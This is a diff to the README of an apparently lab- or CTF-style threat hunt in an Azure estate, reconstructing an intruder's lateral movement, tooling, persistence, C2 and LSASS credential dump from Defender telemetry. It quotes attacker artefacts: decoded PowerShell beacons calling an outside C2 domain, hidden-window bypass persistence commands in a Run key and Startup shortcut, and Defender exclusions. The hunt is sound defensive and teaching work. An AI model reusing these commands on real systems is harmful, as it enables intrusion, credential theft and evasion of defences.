@@ -4,7 +4,7 @@
 
 ## Overview
 
-A post-intrusion threat hunt conducted inside a corporate Azure estate. The initial breach was already established — this hunt focused on reconstructing **what the operator did after gaining access**: how they persisted, how they communicated out, and what they ultimately reached for.
+A post-intrusion threat hunt inside a corporate Azure estate. The breach was already established — this hunt reconstructed **the full operator playbook after access was gained**: how they moved laterally, deployed tooling, silenced defenses, established persistent C2, dumped credentials, and confirmed live desktop access.
 
 **Environment:** Microsoft Sentinel / Microsoft Defender for Endpoint (MDE)  
 **Date of Activity:** December 13, 2025  
@@ -19,51 +19,187 @@ A post-intrusion threat hunt conducted inside a corporate Azure estate. The init
 |---|---|
 | SIEM | Microsoft Sentinel |
 | EDR | Microsoft Defender for Endpoint (MDE) |
-| Log Sources | DeviceLogonEvents, DeviceProcessEvents, DeviceFileEvents, DeviceNetworkEvents, DeviceRegistryEvents |
-| Target hosts | `azwks-phtg-01`, `azwks-phtg-02` |
+| Log Sources | DeviceLogonEvents, DeviceProcessEvents, DeviceFileEvents, DeviceNetworkEvents, DeviceRegistryEvents, DeviceEvents |
+| Entry host | `azwks-phtg-02` |
+| Pivot host | `azwks-phtg-01` |
 | Operator account | `vmadminusername` |
 
 ---
 
-## Hunt Walkthrough
+## Attack Chain
 
-| Phase | Finding | Link |
+### Initial Access — Credential Reuse from a Compromised Workstation
+
+At **09:27:58 UTC**, `vmadminusername` authenticated to `azwks-phtg-02` from `173.244.55.131` — the IP of `sarah-chen`'s workstation. Pre-logon failure events show `UnauthorizedLogonType`, not wrong passwords — the credentials were valid from the first attempt. No brute force, no spray. The account was already compromised.
+
+`sarah-chen`'s machine is not a relay — it is the operator's external launch point.
+
+**MITRE:** T1078 — Valid Accounts
+
+![P01 — Cold Trail](assets/p01-cold-trail.png)
+![Q01 — Brute Force Assumption](assets/q01-brute-force-assumption.png)
+
+---
+
+### Lateral Movement — Pre-Staged RDP File
+
+**21 minutes after entry**, at 09:48 UTC, the operator launched a pre-staged RDP file from the Downloads folder:
+
+```
+C:\Users\vmAdminUsername\Downloads\azwks-phtg-01 (1).rdp
+```
+
+The file was already on disk. The operator came prepared — this was not exploratory movement, it was a planned pivot to a specific second target. `CredentialUIBroker` fired immediately after `mstsc.exe`, and a successful logon to `azwks-phtg-01` (10.0.0.105) was recorded. No further lateral movement beyond this second hop was detected.
+
+**MITRE:** T1021.001 — Remote Services: Remote Desktop Protocol
+
+![P02 — First Footsteps](assets/p02-first-footsteps.png)
+![Q02 — Lateral Movement](assets/q02-lateral-movement.png)
+
+---
+
+### Tooling Deployment — Download-Then-Execute
+
+On `azwks-phtg-01`, a pre-staged PowerShell script (`_.ps1` from the user-profile PHTG directory) made an outbound HTTPS call to `updates.health-cloud.cc`. **One second later**, `PHtGHealthCloudSvc.exe` launched — the script fetched the binary and executed it immediately. Classic download-then-execute: the PS1 is the bridge between the staging server and the host.
+
+All operator tooling was staged under `C:\ProgramData\PHTG\HealthCloud\` across three subdirectories (`Cache`, `Bin`, `TempCache`), masquerading as a legitimate health cloud software installation.
+
+The implant `PHtGHealthCloudSvc.exe` spoofed `bitsadmin.exe` via VersionInfo tampering — running from a staging path rather than a system directory, which is what separated it from the background noise of other FileName/OriginalFileName mismatches.
+
+All PowerShell execution used:
+```powershell
+-WindowStyle Hidden -ExecutionPolicy Bypass
+```
+
+**MITRE:** T1105 — Ingress Tool Transfer, T1036.003 — Masquerading: Rename System Utilities, T1059.001 — PowerShell, T1564.003 — Hidden Window
+
+![Q04 — First Operator Script](assets/q04-first-operator-script.png)
+![Q08 — LOLBin Masquerade](assets/q08-lolbin-masquerade.png)
+![Q18 — Deployment Pattern](assets/q18-deployment-pattern.png)
+
+---
+
+### Defense Evasion — Silencing Defender Before Persistence Lands
+
+Before planting persistence, the operator ran `AMSI_probe.ps1` to confirm the environment wouldn't detonate alerts, then applied a temporary Defender exclusion via `Add-MpPreference` against the user-profile PHTG path. The exclusion was removed with `Remove-MpPreference` within seconds — a window just long enough for the payload to drop without triggering a detection, short enough to avoid a permanent exclusion that would attract attention.
+
+After persistence was in place, two permanent exclusions were added:
+
+```powershell
+# Written via msmpeng.exe — Defender blinding itself
+ExclusionPath:    C:\ProgramData\PHTG\HealthCloud\Cache
+ExclusionProcess: C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe
+```
+
+Defender detected `PHTG HealthCloud.lnk` and generated two `AntivirusReport` events — but `WasExecutingWhileDetected: false` confirms persistence was already in place when caught. Detection without blocking.
+
+`attrib.exe` applied hidden+system attributes across `Cache` (17 modifications) and `TempCache` (2 modifications). Two `cmd.exe` invocations chained payload launches to break parent-process lineage in telemetry.
+
+**MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools, T1564 — Hide Artifacts, T1059.003 — cmd.exe Lineage Break
+
+![P06 — Doors Held Open](assets/p06-doors-held-open.png)
+![Q07 — Attrib Commands](assets/q07-attrib-commands.png)
+![Q20 — AMSI Probe](assets/q20-amsi-probe.png)
+![Q22 — Defender Tampering](assets/q22-defender-tampering.png)
+![Q24 — Temp Exclusion Add](assets/q24-temp-exclusion-add.png)
+
+---
+
+### Persistence — Three Mechanisms
+
+**1. Startup LNK — fires at every user logon**
+```powershell
+C:\Users\vmAdminUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PHTG HealthCloud.lnk
+→ PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-05.ps1
+```
+
+**2. Run Key — fires at every user logon (independent path)**
+```
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Value: PHTGHealthCloudTray
+Data:  powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
+```
+
+**3. HKLM EventLog Registration — blends implant activity into trusted log streams**
+```
+HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud
+```
+Registering a custom Application event log source allows the implant to write to the Windows Application log under its own name — activity that sits inside trusted telemetry and draws far less scrutiny than events in an unknown log.
+
+All three mechanisms were installed at **10:13 UTC** — 25 minutes after landing on `azwks-phtg-01`.
+
+**MITRE:** T1547.001 — Registry Run Keys / Startup Folder, T1112 — Modify Registry
+
+![P03 — Quiet Roots](assets/p03-quiet-roots.png)
+![Q10 — Persistence Signal](assets/q10-persistence-signal.png)
+![Q11 — Run Key Value](assets/q11-run-key-value.png)
+![Q13 — Startup LNK](assets/q13-startup-lnk.png)
+![Q14 — HKLM Registry](assets/q14-hklm-registry.png)
+
+---
+
+### Command & Control — Dual Beacons, Cloudflare-Fronted
+
+**Channel 1 — implant healthcheck loop:**
+`PHtGHealthCloudSvc.exe` (masquerading as `bitsadmin.exe`) ran a persistent beacon loop, firing **22 healthcheck executions** during post-access activity to confirm the implant was alive.
+
+**Channel 2 — encoded PowerShell beacons:**
+Two `-EncodedCommand` payloads decoded via `base64_decode_tostring()` in KQL:
+
+```powershell
+Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
+Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?device=azwks-phtg-01"  -UseBasicParsing -TimeoutSec 5 | Out-Null
+```
+
+Both subdomains resolved to Cloudflare-fronted IPs over port 443/TLS, blending with normal HTTPS traffic. The dual-channel design is deliberate: if one channel is cut, the operator retains access via the other, and each channel serves a distinct function (liveness vs. tasking).
+
+```
+health-cloud.cc
+├── updates.health-cloud.cc → 104.21.36.232 (Cloudflare)
+└── status.health-cloud.cc  → 172.67.200.204 (Cloudflare)
+```
+
+**MITRE:** T1071.001 — Application Layer Protocol: Web Protocols, T1027 — Obfuscated Files, T1090 — Proxy
+
+![P04 — Beacon Pair](assets/p04-beacon-pair.png)
+![P05 — Outbound Whispers](assets/p05-outbound-whispers.png)
+![Q15 — Healthcheck Loop](assets/q15-healthcheck-loop.png)
+![Q16 — Encoded Beacons](assets/q16-encoded-beacons.png)
+
+---
+
+### Credential Access — LSASS Memory Read
+
+Among 139 `OpenProcessApiCall` events targeting `lsass.exe`, 138 came from expected baseline processes (MsMpEng, WmiPrvSE, SenseIR, system context). One did not: `powershell.exe` running under `vmadminusername`.
+
+Two `OpenProcessApiCall` events fired one second apart:
+
+| Time | DesiredAccess | Meaning |
 |---|---|---|
-| P01 | Cold Trail — First Contact | [Hunt Notes](hunt-notes.md#p01--cold-trail-first-session) |
-| P02 | First Footsteps — Earliest On-Host Activity | [Hunt Notes](hunt-notes.md#p02--first-footsteps-earliest-on-host-activity) |
-| P03 | Quiet Roots — Persistence | [Hunt Notes](hunt-notes.md#p03--quiet-roots-persistence) |
-| P04 | The Beacon Pair — C2 Callouts | [Hunt Notes](hunt-notes.md#p04--the-beacon-pair-c2-callouts) |
-| P05 | Outbound Whispers — Where Traffic Went | [Hunt Notes](hunt-notes.md#p05--outbound-whispers-where-traffic-went) |
-| P06 | Doors Held Open — Defence Evasion | [Hunt Notes](hunt-notes.md#p06--doors-held-open-defence-evasion) |
-| P07 | Hands on the Vault — Final Actions | [Hunt Notes](hunt-notes.md#p07--hands-on-the-vault-final-actions) |
-| Q01 | The Brute Force Assumption — Credential Reuse (T1078) | [Hunt Notes](hunt-notes.md#q01--the-brute-force-assumption) |
-| Q02 | Lateral Movement Summary — RDP Pivot (T1021) | [Hunt Notes](hunt-notes.md#q02--lateral-movement-summary) |
-| Q03 | Onward Movement Check — No Further Pivoting | [Hunt Notes](hunt-notes.md#q03--onward-movement-check) |
-| Q04 | First Operator Script — PowerShell from User Profile (T1059.001) | [Hunt Notes](hunt-notes.md#q04--first-operator-script) |
-| Q05 | Operator Concealment Flags — Hidden Window + Bypass (T1564.003) | [Hunt Notes](hunt-notes.md#q05--operator-concealment-flags) |
-| Q06 | Staging Directory — ProgramData Masquerade (T1036) | [Hunt Notes](hunt-notes.md#q06--staging-directory) |
-| Q07 | Concealment Pattern — attrib.exe Hiding (T1564) | [Hunt Notes](hunt-notes.md#q07--concealment-pattern) |
-| Q08 | LOLBin Masquerade — PHtGHealthCloudSvc.exe → bitsadmin.exe (T1036.003) | [Hunt Notes](hunt-notes.md#q08--lolbin-masquerade-identification) |
-| Q09 | Registry Activity Volume — 280 Events Post-Lateral | [Hunt Notes](hunt-notes.md#q09--registry-activity-volume) |
-| Q10 | Persistence Signal Isolation — Run Key (T1547.001) | [Hunt Notes](hunt-notes.md#q10--persistence-signal-isolation) |
-| Q11 | Run Key Value Name — PHTGHealthCloudTray (T1547.001) | [Hunt Notes](hunt-notes.md#q11--run-key-value-name) |
-| Q12 | Run Key Persistence Command — Hidden PS1 at Logon (T1547.001) | [Hunt Notes](hunt-notes.md#q12--run-key-persistence-command) |
-| Q13 | Second Persistence — Startup LNK (T1547.001) | [Hunt Notes](hunt-notes.md#q13--second-persistence-mechanism) |
-| Q14 | Third Persistence — HKLM EventLog Registration (T1112) | [Hunt Notes](hunt-notes.md#q14--third-persistence-mechanism) |
-| Q15 | Healthcheck Beacon Loop — 22 Executions (T1071.001) | [Hunt Notes](hunt-notes.md#q15--tooling-healthcheck-loop) |
-| Q16 | Encoded Beacon Endpoints — Base64 Decoded C2 URIs (T1027, T1071) | [Hunt Notes](hunt-notes.md#q16--encoded-beacon-endpoints) |
-| Q17 | Dual-Channel C2 Rationale — Resiliency + Function Split (T1090) | [Hunt Notes](hunt-notes.md#q17--two-beacons-why) |
-| Q18 | Deployment Pattern — Download then Execute (T1105) | [Hunt Notes](hunt-notes.md#q18--deployment-pattern-recognition) |
-| Q19 | Operator Outbound Domains — health-cloud.cc Subdomains (T1071.001) | [Hunt Notes](hunt-notes.md#q19--operator-outbound-domains) |
-| Q20 | AMSI Probe Identification — Pre-Payload Defense Check (T1562.001) | [Hunt Notes](hunt-notes.md#q20--amsi-probe-identification) |
-| Q21 | Lineage Break Pattern — cmd.exe Intermediary (T1059.003) | [Hunt Notes](hunt-notes.md#q21--lineage-break-pattern) |
-| Q22 | Defender Tampering — Path + Process Exclusions (T1562.001) | [Hunt Notes](hunt-notes.md#q22--defender-tampering) |
-| Q23 | Defender Detection Outcome — Detected but Not Blocked (T1562.001) | [Hunt Notes](hunt-notes.md#q23--defender-detection-outcome) |
-| Q24 | Temporary Defender Exclusion — Add-then-Remove Pattern (T1562.001) | [Hunt Notes](hunt-notes.md#q24--temporary-defender-exclusion) |
-| Q26 | Custom Event Log Source Purpose — Blend into Application Log (T1112) | [Hunt Notes](hunt-notes.md#q26--custom-event-log-source-purpose) |
-| Q27 | LSASS Access Anomaly — powershell.exe under vmadminusername (T1003.001) | [Hunt Notes](hunt-notes.md#q27--lsass-access-anomaly) |
-| Q28 | Access Right Escalation — PROCESS_ALL_ACCESS (T1003.001) | [Hunt Notes](hunt-notes.md#q28--access-right-escalation) |
-| Q29 | Credential Dump Confirmation — ReadProcessMemoryApiCall (T1003.001) | [Hunt Notes](hunt-notes.md#q29--credential-dump-confirmation) |
+| T+0s | Query handle | Enumeration only |
+| T+1s | `0x1FFFFF` — `PROCESS_ALL_ACCESS` | Full read/write/memory access |
+
+The escalation from query to `PROCESS_ALL_ACCESS` is the signal. A `ReadProcessMemoryApiCall` event against `lsass.exe` confirmed the operator followed through — credential dump confirmed.
+
+**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
+
+![Q27 — LSASS Access](assets/q27-lsass-access.png)
+![Q28 — Access Rights](assets/q28-access-rights.png)
+![Q29 — Memory Read](assets/q29-memory-read.png)
+
+---
+
+### Final Actions — M365 Targeting + Confirmed Live Access
+
+`phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly — the operator targeting M365 authentication. Persistence confirmed firing independently at **13:40 UTC** via scheduled task, without an active RDP session.
+
+At **15:55 UTC**, the operator went hands-on-keyboard: `notepad.exe`, `calc.exe`, and `mspaint.exe` launched interactively — confirming live desktop access nearly 6.5 hours after initial entry.
+
+**MITRE:** T1078.004 — Valid Accounts: Cloud Accounts
+
+![P07 — M365 Auth](assets/p07-m365-auth.png)
+![P07 — Scheduled Task](assets/p07-scheduled-task.png)
+![P07 — Hands on Keyboard](assets/p07-hands-on-keyboard.png)
 
 ---
 
@@ -71,24 +207,24 @@ A post-intrusion threat hunt conducted inside a corporate Azure estate. The init
 
 | Type | Value |
 |---|---|
-| External IP | `173.244.55.131` |
+| External IP | `173.244.55.131` (sarah-chen) |
+| Entry host | `azwks-phtg-02` |
+| Pivot host | `azwks-phtg-01` |
+| Operator account | `vmadminusername` |
 | C2 domain | `health-cloud.cc` |
 | C2 subdomain | `updates.health-cloud.cc` |
 | C2 subdomain | `status.health-cloud.cc` |
 | C2 IP | `104.21.36.232` (Cloudflare-fronted) |
 | C2 IP | `172.67.200.204` (Cloudflare-fronted) |
-| Operator account | `vmadminusername` |
-| Launch host | `sarah-chen` |
-| Entry host | `azwks-phtg-02` |
-| Pivot host | `azwks-phtg-01` |
 | Implant path | `C:\ProgramData\PHTG\HealthCloud\` |
-| Implant service | `PHGTHealthCloudSvc.exe` |
-| Persistence | `PHTG HealthCloud.lnk` (Startup folder) |
+| Implant binary | `PHtGHealthCloudSvc.exe` (masquerades as `bitsadmin.exe`) |
+| Startup LNK | `PHTG HealthCloud.lnk` |
+| Run key value | `PHTGHealthCloudTray` |
 
 ---
 
-## Summary
+## Full Hunt Notes
 
-The operator entered via `sarah-chen`'s machine (`173.244.55.131`) authenticating as `vmadminusername` to `azwks-phtg-02` at 09:27 UTC. Within 21 minutes they pivoted to `azwks-phtg-01` using a pre-staged RDP file — indicating prior reconnaissance. Persistence was established via a Startup LNK and a Run key entry, both executing hidden PowerShell scripts. Two Base64-encoded C2 beacons checked in to `health-cloud.cc` subdomains fronted by Cloudflare, running in parallel with a masquerade binary (`PHGTHealthCloudSvc.exe` → `bitsadmin.exe`) healthcheck loop for dual-channel resilience. Defender was blinded via `Add-MpPreference` exclusions — including a temporary add-then-remove pattern to avoid leaving a permanent footprint. The operator also registered a custom Application event log source to blend tooling output into trusted log streams. Final actions confirmed hands-on-keyboard access and credential dumping via `ReadProcessMemoryApiCall` against LSASS under `PROCESS_ALL_ACCESS`.
+For the complete phase-by-phase and question-by-question KQL walkthrough, see [hunt-notes.md](hunt-notes.md).
 
-**Key skills demonstrated:** KQL threat hunting across 5 MDE tables, C2 infrastructure analysis, persistence mechanism identification, defence evasion detection, LOLBin masquerade identification, LSASS credential dump confirmation, MITRE ATT&CK mapping.
+**Key skills demonstrated:** KQL threat hunting across 6 MDE/Sentinel tables, C2 infrastructure analysis and Base64 decoding, persistence mechanism identification (LNK + Run key + HKLM), Defender evasion detection, LSASS credential dump confirmation, MITRE ATT&CK mapping (T1003, T1021, T1027, T1036, T1059, T1071, T1078, T1090, T1105, T1112, T1547, T1562, T1564).
